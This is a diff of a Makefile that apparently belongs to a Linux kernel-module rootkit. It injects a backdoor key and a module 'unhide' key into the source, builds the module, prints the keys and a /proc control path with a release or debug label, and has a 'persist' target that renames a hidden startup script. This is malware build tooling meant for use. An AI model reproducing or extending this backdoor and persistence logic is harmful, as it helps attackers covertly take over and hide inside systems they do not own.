@@ -49,11 +49,17 @@ all:
 	@sed -i 's#^static uint64_t __attribute__((unused)) auto_bdkey = .*#static uint64_t __attribute__((unused)) auto_bdkey = $(BDKEY);#' src/auto.h
 	@sed -i 's#^static uint64_t __attribute__((unused)) auto_unhidekey = .*#static uint64_t __attribute__((unused)) auto_unhidekey = $(UNHIDEKEY);#' src/auto.h
 	make  -C  /lib/modules/$(shell uname -r)/build M=$(PWD) modules
-	@echo -n "Save this Backdoor KEY: "
-	@echo $(BDKEY) | sed 's/^0x//'
-	@echo -n "Save this LKM unhide KEY: "
-	@echo $(UNHIDEKEY) | sed 's/^0x//'
-	@echo PROCNAME=$(PROCNAME)
+	@echo -n "Backdoor KEY: "
+	@echo "\033[1;37m$(BDKEY)\033[0m" | sed 's/0x//'
+	@echo -n "LKM unhide KEY: "
+	@echo "\033[1;37m$(UNHIDEKEY)\033[0m" | sed 's/0x//'
+	@echo "UI: \033[1;37m/proc/$(PROCNAME)\033[0m"
+	@echo -n "Build type: "
+ifdef DEPLOY
+	@echo "\033[1;37mRELEASE\033[0m"
+else
+	@echo "\033[1;37mDEBUG\033[0m"
+endif
 
 persist:
 	sed -i "s|.lm.sh|${UUIDGEN}.sh|g" $(persist).S
